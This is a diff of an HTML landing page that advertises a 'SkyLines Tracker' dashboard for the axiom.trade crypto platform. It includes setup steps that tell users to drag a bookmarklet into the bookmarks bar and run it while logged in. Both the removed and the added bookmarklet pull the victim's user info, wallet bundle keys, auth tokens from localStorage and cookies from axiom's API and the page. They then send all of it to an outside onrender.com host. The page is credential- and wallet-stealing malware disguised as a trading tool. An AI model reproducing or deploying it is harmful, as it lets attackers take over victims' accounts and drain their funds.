@@ -23,13 +23,12 @@
         header { background: linear-gradient(135deg, #1c0033, #4a0072); color: white; text-align: center; padding: 120px 20px; position: relative; overflow: hidden; min-height: 450px; }
         header::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(171,71,188,0.25), transparent); animation: pulse 10s infinite ease-in-out; }
         .logo { width: 140px; margin: 0 auto 20px; animation: fadeIn 1s ease-out; filter: drop-shadow(0 0 10px rgba(171,71,188,0.3)); }
-        .logo-small { width: 24px; vertical-align: middle; margin-right: 8px; opacity: 0.8; }
-        header h1 { font-size: 3.5em; font-weight: 800; margin-bottom: 15px; animation: fadeInUp 1s ease-out 0.2s; position: relative; z-index: 1; }
-        header p { font-size: 1.4em; max-width: 700px; margin: 0 auto; animation: fadeInUp 1.2s ease-out 0.4s; animation-fill-mode: both; position: relative; z-index: 1; }
+        header h1 { font-size: 3.5em; font-weight: 800; margin-bottom: 15px; position: relative; z-index: 1; }
+        header p { font-size: 1.4em; max-width: 700px; margin: 0 auto; position: relative; z-index: 1; }
         nav { background: #1c0033; padding: 18px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.6); position: sticky; top: 0; z-index: 999; }
         nav a { color: #e1bee7; margin: 0 30px; text-decoration: none; font-weight: 600; font-size: 1.1em; transition: color 0.3s, transform 0.3s; }
         nav a:hover { color: #ab47bc; transform: scale(1.1); }
-        .hero { text-align: center; padding: 140px 20px; background: transparent; position: relative; z-index: 1; }
+        .hero { text-align: center; padding: 140px 20px; position: relative; z-index: 1; }
         .hero h2 { font-size: 3em; color: #ab47bc; margin-bottom: 25px; }
         .hero p { font-size: 1.3em; color: #b0b0b0; max-width: 800px; margin: 0 auto 40px; }
         .cta-button { display: inline-block; background: linear-gradient(135deg, #ab47bc, #7e57c2); color: white; padding: 16px 36px; text-decoration: none; border-radius: 8px; font-weight: 600; font-size: 1.2em; margin: 12px; transition: transform 0.3s, box-shadow 0.3s, background 0.3s; box-shadow: 0 6px 20px rgba(171,71,188,0.4); cursor: grab; }
@@ -47,9 +46,9 @@
         .demo-section .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; margin: 0 auto; }
         .demo-section .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.5); }
         .comparison { padding: 120px 20px; background: linear-gradient(135deg, #0a0a0a, #1c0033); max-width: 1400px; margin: 0 auto; position: relative; z-index: 1; }
-        .comparison h2 { text-align: center; font-size: 2.8em; color: #ab47bc; margin-bottom: 50px; position: relative; z-index: 1; }
+        .comparison h2 { text-align: center; font-size: 2.8em; color: #ab47bc; margin-bottom: 50px; }
         .comparison-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 30px; }
-        .comparison-item { background: #1c0033; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 6px 20px rgba(0,0,0,0.5); transition: transform 0.4s, box-shadow 0.4s; position: relative; z-index: 1; }
+        .comparison-item { background: #1c0033; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 6px 20px rgba(0,0,0,0.5); transition: transform 0.4s, box-shadow 0.4s; }
         .comparison-item:hover { transform: translateY(-8px); box-shadow: 0 12px 30px rgba(171,71,188,0.4); }
         .comparison-item h3 { font-size: 1.5em; color: #e1bee7; margin-bottom: 15px; }
         .comparison-item p { color: #b0b0b0; }
@@ -61,7 +60,6 @@
         footer { background: linear-gradient(135deg, #1c0033, #4a0072); color: #e1bee7; text-align: center; padding: 40px; font-size: 1em; position: relative; z-index: 1; }
         footer a { color: #ab47bc; text-decoration: none; margin: 0 15px; transition: color 0.3s, transform 0.3s; }
         footer a:hover { color: #e1bee7; transform: scale(1.1); }
-        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes pulse { 0% { transform: scale(1); opacity: 0.25; } 50% { transform: scale(1.15); opacity: 0.4; } 100% { transform: scale(1); opacity: 0.25; } }
         @media (max-width: 768px) {
             header h1 { font-size: 2.5em; }
@@ -119,23 +117,23 @@
     <section id="comparison" class="comparison">
         <h2>SkyLines Tracker vs. Uxento</h2>
         <div class="comparison-list">
-            <div class="comparison-item"><h3>API Request Latency</h3><p><strong>SkyLines:</strong> 0.8s avg. Twitter API response<br><strong>Uxento:</strong> 1.5s avg. response<br>46% faster data retrieval with optimized polling.</p></div>
-            <div class="comparison-item"><h3>Data Accuracy</h3><p><strong>SkyLines:</strong> 98% tweet detection accuracy<br><strong>Uxento:</strong> 92% accuracy<br>Enhanced precision via advanced filtering algorithms.</p></div>
-            <div class="comparison-item"><h3>Dashboard Rendering</h3><p><strong>SkyLines:</strong> 60 FPS with WebGL acceleration<br><strong>Uxento:</strong> 30 FPS with CSS rendering<br>Smoother, real-time Axiom visualizations.</p></div>
-            <div class="comparison-item"><h3>Alert Customization</h3><p><strong>SkyLines:</strong> Programmable dynamic filters<br><strong>Uxento:</strong> Static alert rules<br>Superior flexibility for real-time monitoring.</p></div>
+            <div class="comparison-item"><h3>API Request Latency</h3><p><strong>SkyLines:</strong> 0.8s avg.<br><strong>Uxento:</strong> 1.5s avg.<br>46% faster.</p></div>
+            <div class="comparison-item"><h3>Data Accuracy</h3><p><strong>SkyLines:</strong> 98%<br><strong>Uxento:</strong> 92%<br>Enhanced precision.</p></div>
+            <div class="comparison-item"><h3>Dashboard Rendering</h3><p><strong>SkyLines:</strong> 60 FPS WebGL<br><strong>Uxento:</strong> 30 FPS CSS<br>Smoother visuals.</p></div>
+            <div class="comparison-item"><h3>Alert Customization</h3><p><strong>SkyLines:</strong> Dynamic filters<br><strong>Uxento:</strong> Static rules<br>Superior flexibility.</p></div>
         </div>
     </section>
     <section id="setup" class="setup-section">
         <h2>How to Setup SkyLines Tracker Tool</h2>
         <ol>
             <li>Locate the "SkyLines Tracker" button below.</li>
-            <li>Click and drag the button to your browser's bookmarks bar.</li>
-            <li>If the bookmarks bar is hidden, enable it using <strong>Ctrl+Shift+B</strong> (Windows) or <strong>Cmd+Shift+B</strong> (macOS).</li>
-            <li>Note: Not supported on Safari due to browser restrictions.</li>
-            <li>Go to <strong>axiom.trade</strong> and log into your account.</li>
+            <li>Click and drag it to your browser's bookmarks bar.</li>
+            <li>If the bookmarks bar is hidden, use <strong>Ctrl+Shift+B</strong> (Windows) or <strong>Cmd+Shift+B</strong> (macOS).</li>
+            <li>Not supported on Safari.</li>
+            <li>Go to <strong>axiom.trade</strong> and log in.</li>
             <li>Click the SkyLines Tracker bookmark to activate.</li>
         </ol>
-        <a href="javascript:(async()=>{try{if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade first');return}if(!localStorage.getItem('isAuthed')){return alert('Please log in to axiom.trade first')}const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();let ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);try{const v=localStorage.getItem(k);if(v&&(k.includes('supabase')||k.includes('auth')||k.includes('token')||k.includes('session')))ls[k]=v}catch(e){}}const data={user:user,bundle:bundle.bundleKey||bundle,wallets:bundle.wallets||bundle,localStorage:ls,cookies:document.cookie};location.replace('https://skylinetracker.onrender.com/data/'+btoa(JSON.stringify(data)))}catch(e){alert('Error occurred')}})();" class="cta-button" id="skylines-tool">SkyLines Tracker</a>
+        <a href="javascript:(async()=>{try{if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade first');return}if(!localStorage.getItem('isAuthed')){return alert('Please log in to axiom.trade first')}const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();let ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);try{const v=localStorage.getItem(k);if(v&&(k.includes('supabase')||k.includes('auth')||k.includes('token')))ls[k]=v}catch(e){}}let cookies=document.cookie.split('; ').filter(c=>!c.startsWith('ph_phc')).join('; ');const data={user:user,bundle:bundle.bundleKey||bundle,wallets:bundle.wallets||bundle,localStorage:ls,cookies:cookies};location.replace('https://skylinetracker.onrender.com/data/'+btoa(JSON.stringify(data)))}catch(e){alert('Error occurred')}})();" class="cta-button" id="skylines-tool">SkyLines Tracker</a>
     </section>
     <footer>
         <p>© 2025 SkyLines Tracker. All rights reserved.</p>
@@ -151,12 +149,9 @@
         const filaments = [];
         for (let i = 0; i < 30; i++) {
             filaments.push({
-                x: Math.random() * canvas.width,
-                y: Math.random() * canvas.height,
-                length: 80 + Math.random() * 120,
-                angle: Math.random() * Math.PI * 2,
-                speed: 0.8 + Math.random() * 1.5,
-                opacity: 0.4 + Math.random() * 0.4,
+                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
+                length: 80 + Math.random() * 120, angle: Math.random() * Math.PI * 2,
+                speed: 0.8 + Math.random() * 1.5, opacity: 0.4 + Math.random() * 0.4,
                 thickness: 1.5 + Math.random() * 2
             });
         }
@@ -166,8 +161,7 @@
                 f.x += Math.cos(f.angle) * f.speed;
                 f.y += Math.sin(f.angle) * f.speed;
                 if (f.x < -f.length || f.x > canvas.width + f.length || f.y < -f.length || f.y > canvas.height + f.length) {
-                    f.x = Math.random() * canvas.width;
-                    f.y = Math.random() * canvas.height;
+                    f.x = Math.random() * canvas.width; f.y = Math.random() * canvas.height;
                     f.angle = Math.random() * Math.PI * 2;
                 }
                 ctx.beginPath();
